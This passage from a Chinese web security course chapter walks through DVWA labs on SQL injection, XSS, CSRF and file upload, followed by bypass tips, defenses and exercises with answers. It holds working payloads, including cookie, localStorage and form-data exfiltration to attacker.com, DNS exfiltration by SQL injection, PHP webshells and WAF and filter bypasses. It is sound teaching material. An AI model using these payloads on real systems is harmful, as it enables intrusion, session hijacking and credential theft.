User ID: 1
Name: users
Surname: dvwa

结论：数据库有2个表：guestbook和users
```

**6. 提取列名**
```
输入：1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' -- 
返回（部分）：
Name: user_id
Surname: int

Name: first_name
Surname: varchar

Name: last_name
Surname: varchar

Name: user
Surname: varchar

Name: password
Surname: varchar

结论：users表包含user和password列
```

**7. 提取用户凭据**
```
输入：1' UNION SELECT user, password FROM users -- 
返回：
Name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

Name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

Name: 1337
Surname: 8d3533d75ae2c3966d7e0c3f90638e1b

Name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

Name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

结论：密码使用MD5哈希
```

**8. 破解密码**
```bash
# 使用Hashcat破解
hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt

# 或在线查询
# 访问 https://www.md5online.org/
# 5f4dcc3b5aa765d61d8327deb882cf99 = password
```

**9. 使用SQLmap自动化**
```bash
# 检测注入点
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs

# 提取数据库
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" -D dvwa --tables

# 提取数据
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" -D dvwa -T users --dump
```

#### 防御措施验证
```
1. 将难度设置为"Impossible"
2. 查看源码（使用了参数化查询）
3. 重新测试注入（应该失败）
```

---

### 实验2：XSS实战（DVWA）

#### 目标
- 理解XSS原理
- 掌握反射型XSS和存储型XSS的区别
- 学习绕过过滤技巧

#### 步骤

**1. 反射型XSS（Reflected XSS）**
```
1. 进入"XSS (Reflected)"模块
2. 测试基本payload：
输入：<script>alert('XSS')</script>
返回：弹出alert框

3. 查看源码（Low难度）：
$name = $_GET['name'];
echo "<pre>Hello ${name}</pre>";

结论：未过滤输入
```

**2. 存储型XSS（Stored XSS）**
```
1. 进入"XSS (Stored)"模块
2. 输入payload：
Name: <script>alert('XSS')</script>
Message: Test

3. 提交后，每次访问该页面都会弹出alert框

4. 查看数据库：
mysql -u root -p
USE dvwa;
SELECT * FROM guestbook;

结论：payload被存储到数据库
```

**3. 绕过过滤（Medium难度）**
```
1. 将难度设置为"Medium"
2. 测试基本payload（被过滤）：
输入：<script>alert('XSS')</script>
返回：<scr_ipt>alert('XSS')</script>

3. 绕过技巧：
# 大小写混淆
<input <ScRiPt>alert('XSS')</sCrIpT>

# 使用其他标签
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>

# 使用事件处理器
<input type="text" onfocus=alert('XSS') autofocus>
```

**4. 高级XSS（High难度）**
```
1. 将难度设置为"High"
2. 查看源码（使用了正则过滤）：
$name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name);

3. 绕过技巧：
# 使用<img>标签（不使用<script>）
<img src=x onerror=alert('XSS')>

# 使用<svg>标签
<svg/onload=alert('XSS')>

# 使用<iframe>
<iframe src="javascript:alert('XSS')"></iframe>
```

**5. 窃取Cookie**
```
1. 启动监听服务器：
nc -lvnp 4444

2. 注入payload：
<script>
fetch('http://attacker.com:4444?cookie=' + document.cookie)
</script>

3. 受害者访问页面
4. 攻击者收到Cookie
5. 使用窃取的Cookie劫持会话
```

#### 防御措施
```php
// 错误的做法
echo "<p>Hello " . $_GET['name'] . "</p>";

// 正确的做法（使用htmlspecialchars）
echo "<p>Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";

// 或使用CSP
header("Content-Security-Policy: script-src 'self'");
```

---

### 实验3：CSRF实战（DVWA）

#### 目标
- 理解CSRF原理
- 掌握CSRF攻击构造
- 学习防御措施

#### 步骤

**1. 测试CSRF漏洞**
```
1. 进入"CSRF"模块（Low难度）
2. 修改密码（无需旧密码）：
新密码：password123
确认密码：password123

3. 观察请求：
GET /vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change

4. 构造恶意页面（csrf.html）：
<img src="http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" alt="">

5. 诱导受害者访问csrf.html
6. 受害者密码被修改为"hacked"
```

**2. 分析漏洞原因**
```php
// Low难度源码
if (isset($_GET['Change'])) {
    $pass_new = $_GET['password_new'];
    $pass_conf = $_GET['password_conf'];
    
    if ($pass_new == $pass_conf) {
        $pass_new = md5($pass_new);
        $insert = "UPDATE users SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "'";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert);
        echo "Password Changed.";
    }
}

结论：未验证CSRF Token，仅检查了password_new == password_conf
```

**3. 绕过Medium难度防护**
```
1. 将难度设置为"Medium"
2. 查看源码（检查Referer）：
if (stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false) {
    // 允许请求
}

3. 绕过技巧：
# 在恶意页面文件名中包含目标域名
# 如：http://attacker.com/localhost_csrf.html
# Referer: http://attacker.com/localhost_csrf.html
# stripos()会匹配到"localhost"
```

**4. 防御措施（High难度）**
```php
// High难度源码（使用CSRF Token）
if (isset($_GET['Change'])) {
    checkToken($_REQUEST['user_token'], $_SESSION['session_token'], 'index.php');
    
    // 验证password_new == password_conf
    // 更新密码
}

结论：每次请求都需要有效的CSRF Token
```

**5. 构造CSRF攻击（带Token绕过）**
```
1. 使用XSS获取Token：
<script>
fetch('/vulnerabilities/csrf/')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/user_token" value="(.*?)"/)[1];
    fetch(`/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=${token}`);
  });
</script>

结论：如果同时存在XSS，CSRF Token可以被绕过
```

#### 防御措施
```php
// 1. 使用CSRF Token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 2. 验证Referer（辅助措施）
$referer = $_SERVER['HTTP_REFERER'];
if (strpos($referer, 'example.com') === false) {
    die('CSRF detected');
}

// 3. 使用SameSite Cookie
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

---

### 实验4：文件上传漏洞（DVWA）

#### 目标
- 理解文件上传漏洞原理
- 掌握Webshell上传技巧
- 学习绕过文件类型检查

#### 步骤

**1. 测试文件上传（Low难度）**
```
1. 进入"File Inclusion"模块
2. 上传PHP Webshell（shell.php）：
<?php system($_GET['cmd']); ?>

3. 上传成功
4. 访问：http://localhost/hackable/uploads/shell.php?cmd=id
返回：uid=33(www-data) gid=33(www-data) groups=33(www-data)

结论：可以执行任意命令
```

**2. 绕过文件类型检查（Medium难度）**
```
1. 将难度设置为"Medium"
2. 查看源码（检查Content-Type）：
if (($uploaded_type == "image/jpeg") || ($uploaded_type == "image/png")) {
    // 允许上传
}

3. 绕过技巧：
# 使用Burp Suite拦截请求
# 修改Content-Type: application/x-php → image/jpeg
# 文件内容仍然是PHP代码
```

**3. 绕过文件扩展名检查（High难度）**
```
1. 将难度设置为"High"
2. 查看源码（检查文件扩展名）：
$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);
if (strtolower($uploaded_ext) == "jpg" || strtolower($uploaded_ext) == "jpeg" || strtolower($uploaded_ext) == "png") {
    // 允许上传
}

3. 绕过技巧（文件包含漏洞配合）：
# 上传图片马（shell.jpg）：
GIF89a
<?php system($_GET['cmd']); ?>

# 使用文件包含漏洞执行：
http://localhost/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.jpg&cmd=id
```

**4. 防御措施**
```php
// 1. 检查文件内容（不仅是扩展名）
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $uploaded_file);
if ($mime_type !== 'image/jpeg' && $mime_type !== 'image/png') {
    die('Invalid file type');
}

// 2. 重命名文件
$new_filename = bin2hex(random_bytes(16)) . '.jpg';

// 3. 限制上传目录执行权限
// Apache配置：
<Directory "/var/www/html/uploads">
    Options -ExecCGI
    AddHandler cgi-script .php .php3 .php4 .php5 .phtml
    RemoveHandler .php .php3 .php4 .php5 .phtml
</Directory>

// 4. 使用CDN存储上传文件（不存储在Web根目录）
```

---

## 💡 解题技巧

### 1. SQL注入技巧

**判断注入类型**
```sql
-- 数字型注入
id=1 AND 1=1  -- 返回正常
id=1 AND 1=2  -- 返回异常

-- 字符型注入
id=1' AND '1'='1  -- 返回正常
id=1' AND '1'='2  -- 返回异常

-- 搜索型注入
search=test%' AND 1=1 --  -- 返回正常
```

**绕过WAF**
```sql
-- 使用注释
SELECT/*comment*/FROM users
SELECT/**/FROM users

-- 使用编码
SELECT %0a FROM users  -- %0a = 换行符
SELECT %09 FROM users  -- %09 = 制表符

-- 使用大小写混淆
SeLeCt FrOm users

-- 使用双写绕过
SELECTSELECT FROM users  -- WAF删除SELECT后仍然有SELECT

-- 使用时间盲注（无回显）
1' AND SLEEP(5) -- 
1' AND BENCHMARK(5000000,MD5('test')) -- 
```

**提取数据技巧**
```sql
-- 使用报错注入（无回显）
1' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e)) -- 

-- 使用DNS外带（无回显）
1' AND load_file(concat('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) -- 
```

### 2. XSS技巧

**绕过过滤**
```javascript
// 使用字符串拼接
<img src=x onerror="a=`al`;b=`ert`;c=`XSS`;window[a+b](c)">

// 使用编码
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

// 使用模板字符串
<img src=x onerror="`${alert`XSS`}`">

// 使用SVG
<svg><animate onbegin="alert(1)" attributeName="x">
```

**窃取信息**
```javascript
// 窃取Cookie
fetch('http://attacker.com/steal?cookie=' + document.cookie)

// 窃取LocalStorage
fetch('http://attacker.com/steal?localstorage=' + JSON.stringify(localStorage))

// 窃取表单数据
document.forms[0].addEventListener('submit', (e) => {
    fetch('http://attacker.com/steal?form=' + JSON.stringify(new FormData(e.target)));
});
```

### 3. 命令注入技巧

**绕过过滤**
```bash
# 使用变量
v=cat; $v /etc/passwd

# 使用反引号
`c``a``t` /etc/passwd

# 使用通配符
/c???/b??h  # 可能匹配 /bin/bash

# 使用base64编码
echo "cat /etc/passwd" | base64  # Y2F0IC9ldGMvcGFzc3dkCg==
echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash
```

### 4. 文件包含技巧

**读取敏感文件**
```php
// 使用php://filter读取源码
?page=php://filter/convert.base64-encode/resource=config.php
# 返回base64编码的源码（避免直接执行）

// 使用data://执行代码
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
# base64解码后：<?php system($_GET['cmd']);?>

// 使用expect://执行命令（需要expect扩展）
?page=expect://id
```

### 5. 暴力破解技巧

**优化字典**
```bash
# 使用Crunch生成字典
crunch 6 6 0123456789 -o passwords.txt  # 生成6位数字密码

# 使用Cewl从网站提取单词
cewl http://example.com -w wordlist.txt

# 使用Hashcat规则变换
hashcat -r rules/best64.rule wordlist.txt
```

**分布式破解**
```bash
# 使用Hashcat分布式破解
# 机器1：
hashcat -m 0 hashes.txt wordlist.txt --new-session=session1

# 机器2：
hashcat -m 0 hashes.txt wordlist.txt --session=session1 --restore
```

---

## 🛡️ 防御措施总结

### 1. 输入验证

**原则**：
- 所有用户输入都是不可信的
- 使用白名单而非黑名单
- 在服务器端验证（客户端验证仅用于用户体验）

**实践**：
```python
import re

# 验证用户名（仅允许字母和数字）
if not re.match(r'^[a-zA-Z0-9]{3,20}$', username):
    return "Invalid username", 400

# 验证邮箱
if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
    return "Invalid email", 400

# 验证整数范围
age = request.form.get('age', type=int)
if age is None or age < 1 or age > 150:
    return "Invalid age", 400
```

### 2. 输出编码

**原则**：
- 根据输出上下文选择合适的编码
- HTML上下文：使用HTML实体编码
- JavaScript上下文：使用JavaScript编码
- URL上下文：使用URL编码

**实践**：
```python
import html
import urllib.parse

# HTML编码
safe_input = html.escape(user_input, quote=True)

# JavaScript编码
import json
safe_input = json.dumps(user_input)  # 自动处理特殊字符

# URL编码
safe_url = urllib.parse.quote(user_input, safe='')
```

### 3. 访问控制

**原则**：
- 默认拒绝（Deny by Default）
- 检查每次访问（不要仅依赖前端控制）
- 使用间接引用

**实践**：
```python
from functools import wraps

def role_required(required_role):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not current_user.is_authenticated:
                return redirect(url_for('login'))
            if current_user.role != required_role:
                abort(403)  # Forbidden
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/admin')
@login_required
@role_required('admin')
def admin_panel():
    return render_template('admin.html')
```

### 4. 加密

**原则**：
- 使用标准算法（不要自己发明）
- 使用长密钥（AES-256而非AES-128）
- 保护密钥（使用KMS或HSM）

**实践**：
```python
from cryptography.fernet import Fernet
import base64
import os

# 生成密钥（存储在安全位置）
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# 加密
encrypted = cipher_suite.encrypt(b"Sensitive Data")

# 解密
decrypted = cipher_suite.decrypt(encrypted)
```

### 5. 日志记录

**原则**：
- 记录关键事件（登录、权限变更、数据访问）
- 不包含敏感信息（密码、信用卡号）
- 使用集中式日志管理（ELK Stack）

**实践**：
```python
import logging
from logging.handlers import RotatingFileHandler

# 配置日志
handler = RotatingFileHandler('security.log', maxBytes=10000, backupCount=3)
handler.setLevel(logging.INFO)
app.logger.addHandler(handler)

# 记录安全事件
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    if authenticate(username, request.form['password']):
        app.logger.info(f'Login success: {username}')
        return "Logged in", 200
    else:
        app.logger.warning(f'Login failed: {username}')
        return "Invalid credentials", 401
```

### 6. 安全配置

**原则**：
- 更改默认凭证
- 禁用不必要的功能
- 使用自动化配置管理

**实践**：
```bash
# Apache安全配置
# 禁用目录列表
Options -Indexes

# 隐藏服务器版本
ServerTokens Prod
ServerSignature Off

# 启用安全HTTP头
Header always set X-Frame-Options DENY
Header always set X-Content-Type-Options nosniff
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

### 7. 依赖管理

**原则**：
- 定期更新依赖
- 使用SCA工具
- 监控漏洞情报

**实践**：
```bash
# Python
pip-audit  # 检查漏洞
pip-review --auto  # 自动更新

# Node.js
npm audit  # 检查漏洞
npm update  # 更新依赖

# Docker
trivy image myapp:latest  # 扫描镜像
```

---

## 📖 课后练习

### 练习1：SQL注入挑战

**目标**：从DVWA的数据库中提取所有用户的邮箱。

**提示**：
1. 使用`information_schema.columns`找到邮箱列名
2. 使用`UNION SELECT`提取数据
3. 使用`GROUP_CONCAT()`合并多行结果

**答案**：
```
1' UNION SELECT GROUP_CONCAT(email), NULL FROM users -- 
```

---

### 练习2：XSS挑战

**目标**：在DVWA中弹出一个包含当前Cookie的alert框。

**提示**：
1. 使用`document.cookie`获取Cookie
2. 使用`<script>`标签或事件处理器

**答案**：
```
<script>alert(document.cookie)</script>
```

---

### 练习3：CSRF挑战

**目标**：构造一个恶意页面，诱导受害者修改DVWA密码。

**提示**：
1. 创建一个HTML页面
2. 使用`<img>`或`<iframe>`自动发送请求
3. 托管在攻击者的服务器上

**答案**：
```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF Attack</h1>
<img src="http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
</body>
</html>
```

---

### 练习4：文件上传挑战

**目标**：上传一个PHP Webshell并读取`/etc/passwd`文件。

**提示**：
1. 创建一个PHP文件，使用`system()`函数
2. 上传到DVWA（Low难度）
3. 访问上传的文件并传递命令

**答案**：
```php
<?php
system($_GET['cmd']);
?>
```

访问：`http://localhost/hackable/uploads/shell.php?cmd=cat /etc/passwd`

---

### 练习5：命令注入挑战

**目标**：在DVWA中读取`/etc/passwd`文件（Low难度）。

**提示**：
1. 使用分号（`;`）执行多条命令
2. 使用`|`管道符
3. 使用`&&`逻辑与

**答案**：
```
127.0.0.1; cat /etc/passwd
```

---

## ❓ FAQ（常见问题）

### Q1：学习Web安全需要什么基础？

**A**：
- **必备**：
  - 基础编程能力（Python、PHP、JavaScript至少一种）
  - 理解HTTP协议（请求方法、状态码、Header）
  - 基础Linux命令
- **推荐**：
  - 数据库基础（SQL语法）
  - 网络基础（TCP/IP、DNS）
  - 前端基础（HTML、CSS、JavaScript）

---

### Q2：OWASP Top 10够用吗？

**A**：
- OWASP Top 10是**入门必备**，但不足以应对所有场景
- 进阶学习：
  - **CWE Top 25**：更全面的软件弱点列表
  - **OWASP Testing Guide**：系统化的测试方法
  - **OWASP Cheat Sheet Series**：针对具体问题的防御指南
  - **PortSwigger Web Security Academy**：免费的在线实战训练

---

### Q3：如何合法地学习渗透测试？

**A**：
- **合法途径**：
  - 使用自己的系统（如本地搭建的DVWA）
  - 参与漏洞奖励计划（Bug Bounty），如HackerOne、Bugcrowd
  - 参加CTF比赛（如CTFtime.org）
  - 在授权的情况下进行渗透测试（签署书面协议）
- **非法行为**：
  - 未授权访问他人系统
  - 破坏、篡改、删除数据
  - 传播恶意软件

---

### Q4：如何防止误报？

**A**：
- **手动验证**：自动化工具扫描后，务必手动验证
- **理解原理**：理解漏洞原理，而不是依赖工具
- **测试环境**：在测试环境复现漏洞
- **代码审计**：结合源代码分析

---

### Q5：Web安全和二进制安全有什么区别？

**A**：
- **Web安全**：
  - 关注Web应用层（HTTP、SQL、XSS、CSRF）
  - 使用工具：Burp Suite、SQLmap、OWASP ZAP
  - 适合初学者（入门门槛较低）
- **二进制安全**：
  - 关注底层（内存损坏、缓冲区溢出、ROP）
  - 使用工具：GDB、IDA Pro、OllyDbg
  - 需要深入理解计算机体系结构

---

### Q6：如何保持技能更新？

**A**：
- **关注漏洞情报**：
  - 订阅CVE邮件列表
  - 关注安全研究人员（Twitter、GitHub）
  - 阅读安全博客（如PortSwigger、OWASP）
- **参与社区**：
  - 参加安全会议（BlackHat、DEF CON）
  - 加入本地安全Meetup
  - 参与开源安全项目
- **持续学习**：
  - 学习新出现的漏洞类型（如SSRF、XXE）
  - 学习新的攻击技巧（如绕过WAF）
  - 学习新的防御技术（如CSP、HSTS）

---

### Q7：职业发展方向？

**A**：
- **渗透测试工程师**：
  - 负责对公司系统进行渗透测试
  - 编写渗透测试报告
  - 需要掌握OWASP Top 10、PTES方法论
- **安全研究员**：
  - 挖掘0day漏洞
  - 发表安全论文
  - 需要深入理解底层原理
- **安全开发工程师**：
  - 在开发阶段集成安全措施（DevSecOps）
  - 编写安全库和工具
  - 需要掌握安全编码实践
- **安全顾问**：
  - 为客户提供安全咨询
  - 进行安全评估
  - 需要广泛的安全知识

---

## 📝 总结

### 关键要点

1. **OWASP Top 10是Web安全的基石**：
   - 理解这10大风险，可以防御绝大多数攻击
   - 定期关注OWASP的更新（每3-4年更新一次）

2. **安全是一个持续的过程**：
   - 不是一次性的工作
   - 需要持续监控、更新、改进

3. **防御深度**：
   - 不要依赖单一防御措施
   - 实施多层防御（WAF + 输入验证 + 输出编码 + 访问控制 + 监控）

4. **安全设计优于安全实现**：
   - 在设计阶段考虑安全（威胁建模）
   - 而不是在开发完成后"打补丁"

5. **自动化是必然趋势**：
   - 手动测试无法应对大规模应用
   - 使用SCA、DAST、SAST工具
   - 集成到CI/CD管道（DevSecOps）

### 下一步学习

**进阶课程**：
- **第09章：高级SQL注入技巧**
- **第10章：XSS高级利用**
- **第11章：反序列化漏洞深度剖析**
- **第12章：API安全（REST/GraphQL）**

**认证考试**：
- **OSCP（Offensive Security Certified Professional）**：实战渗透测试认证
- **CEH（Certified Ethical Hacker）**：理论基础认证
- **GWAPT（GIAC Web Application Penetration Tester）**：Web应用渗透测试认证

**实战平台**：
- **PortSwigger Web Security Academy**：免费实战训练
- **HackTheBox**：在线渗透测试实验室
- **TryHackMe**：初学者友好的实战平台

### 参考资料

**官方文档**：
- OWASP Top 10 2021：https://owasp.org/Top10/
- OWASP Testing Guide：https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet Series：https://cheatsheetseries.owasp.org/

**书籍**：
- 《Web安全深度剖析》- 安全牛
- 《白帽子讲Web安全》- 吴翰清
- 《The Web Application Hacker's Handbook》- Dafydd Stuttard

**在线课程**：
- PortSwigger Web Security Academy：https://portswigger.net/web-security
- Cybrary Web Application Penetration Testing：https://www.cybrary.it/course/web-application-penetration-testing/

**工具**：
- Burp Suite：https://portswigger.net/burp
- OWASP ZAP：https://www.zaproxy.org/
- SQLmap：https://sqlmap.org/

---

## 🎓 课程结束

恭喜您完成第08章的学习！

**您已经掌握**：
- ✅ OWASP Top 10 2021的核心内容
- ✅ 10大Web安全风险的原理和防御
- ✅ 使用DVWA、WebGoat等平台进行实战
- ✅ Web安全的思维方式和测试方法

**别忘了**：
- 📝 完成课后练习
- 🔬 在实验环境中实践
- 📚 阅读推荐的参考资料
- 🌐 加入安全社区（如OWASP本地章节）

**下一章预告**：
第09章将深入讲解**高级SQL注入技巧**，包括盲注、时间盲注、DNS外带等高级技术。

---

**祝学习愉快！Keep Hacking, Keep Learning!** 🚀
